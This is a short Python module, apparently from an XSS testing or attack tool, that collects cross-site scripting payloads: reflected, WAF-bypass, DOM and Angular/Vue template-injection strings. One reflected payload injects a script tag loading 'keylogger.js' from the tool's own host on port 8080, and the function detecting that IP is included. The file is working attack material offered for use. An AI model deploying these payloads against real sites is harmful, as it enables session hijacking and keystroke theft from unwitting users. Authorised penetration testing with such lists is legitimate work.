"""
xss_payloads.py – classic, modern template‑inject, WAF bypass, Base64 iframe.
"""
import socket
from utils import b64_iframe

def _my_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        return "localhost"

ATTACK_IP = _my_ip()

# ---------- Payloads ----------
REFLECTIVE = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    f'<script src="http://{ATTACK_IP}:8080/keylogger.js"></script>',
]

WAF_BYPASS = [
    '<script>confirm`1`</script>',
    '<img src=x onerror=alert`1`>',
    b64_iframe("alert(1)"),
]

# DOM payload reliably fires + sets flag
DOM = [
    '<svg><script>window.__domxss=1</script></svg>',
]

# Modern template‑injection (Angular / Vue / React SSR)
TEMPLATE = [
    '{{constructor.constructor("alert(1)")()}}',
    '{{__proto__.constructor.constructor("alert(1)")()}}',
]

ALL = REFLECTIVE + DOM + TEMPLATE

def all_payloads(include_waf: bool) -> list[str]:
    return ALL + (WAF_BYPASS if include_waf else [])
